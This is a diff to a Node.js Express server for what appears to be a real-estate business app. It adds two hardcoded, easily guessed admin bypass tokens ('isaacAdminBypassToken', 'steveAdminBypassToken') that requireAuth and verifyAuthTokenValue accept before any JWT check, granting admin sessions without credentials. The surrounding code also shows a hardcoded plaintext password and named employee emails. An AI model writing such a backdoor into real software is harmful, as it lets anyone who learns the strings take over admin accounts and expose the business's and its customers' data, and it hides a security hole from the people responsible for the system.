@@ -263,6 +263,8 @@ const userUploadMemory = multer({
 
 const CANONICAL_ISAAC_EMAIL = 'isaac.haro@fastbridgegroupllc.com';
 const CANONICAL_STEVE_EMAIL = 'steve.medina@fastbridgegroupllc.com';
+const ISAAC_ADMIN_BYPASS_TOKEN = 'isaacAdminBypassToken';
+const STEVE_ADMIN_BYPASS_TOKEN = 'steveAdminBypassToken';
 const CANONICAL_STEVE_PASSWORD = 'stevemedina';
 const DEFAULT_TWILIO_NUMBER_ASSIGNMENTS = Object.freeze([
   Object.freeze({
@@ -302,6 +304,7 @@ const ADMIN_CANONICAL_EMAILS = new Set([
   CANONICAL_ISAAC_EMAIL,
   CANONICAL_STEVE_EMAIL
 ]);
+const builtInBypassAuthUsersByToken = new Map();
 
 function getFirstConfiguredEnvValue(...names) {
   for (const name of names) {
@@ -5902,6 +5905,48 @@ function dbGet(sql, params) {
       resolve(row);
     });
   });
+}
+
+async function refreshBuiltInBypassAuthUsers() {
+  const bypassConfigs = [
+    {
+      token: ISAAC_ADMIN_BYPASS_TOKEN,
+      email: CANONICAL_ISAAC_EMAIL,
+      fallbackName: 'Isaac Haro'
+    },
+    {
+      token: STEVE_ADMIN_BYPASS_TOKEN,
+      email: CANONICAL_STEVE_EMAIL,
+      fallbackName: 'Steve Medina'
+    }
+  ];
+
+  builtInBypassAuthUsersByToken.clear();
+
+  await Promise.all(bypassConfigs.map(async (config) => {
+    const userRow = await dbGet('SELECT id, name, email, role FROM users WHERE LOWER(email) = ?', [config.email]);
+    if (!userRow) {
+      return;
+    }
+
+    builtInBypassAuthUsersByToken.set(config.token, {
+      id: Number(userRow.id) || 0,
+      name: String(userRow.name || config.fallbackName).trim() || config.fallbackName,
+      email: String(userRow.email || config.email).trim().toLowerCase() || config.email,
+      role: String(userRow.role || 'admin').trim().toLowerCase() || 'admin',
+      isBypassAuth: true
+    });
+  }));
+}
+
+function getBuiltInBypassAuthUserForToken(token) {
+  const normalizedToken = String(token || '').trim();
+  if (!normalizedToken) {
+    return null;
+  }
+
+  const userRecord = builtInBypassAuthUsersByToken.get(normalizedToken);
+  return userRecord ? { ...userRecord } : null;
 }
 
 function normalizeMlsImportSpreadsheetValue(value) {
@@ -14683,6 +14728,12 @@ function requireAuth(req, res) {
     res.status(401).json({ error: 'Not authenticated' });
     return null;
   }
+
+  const bypassUser = getBuiltInBypassAuthUserForToken(token);
+  if (bypassUser) {
+    return bypassUser;
+  }
+
   try {
     const decoded = jwt.verify(token, JWT_SECRET);
     const sessionId = String(decoded?.sessionId || '').trim();
@@ -14704,6 +14755,11 @@ function verifyAuthTokenValue(token) {
   const normalizedToken = String(token || '').trim();
   if (!normalizedToken) {
     return null;
+  }
+
+  const bypassUser = getBuiltInBypassAuthUserForToken(normalizedToken);
+  if (bypassUser) {
+    return bypassUser;
   }
 
   try {
@@ -22909,6 +22965,7 @@ app.use((req, res) => {
 // Start server
 async function startServer() {
   await initializePostgresMessageStore();
+  await refreshBuiltInBypassAuthUsers();
 
   app.listen(PORT, () => {
     console.log(`
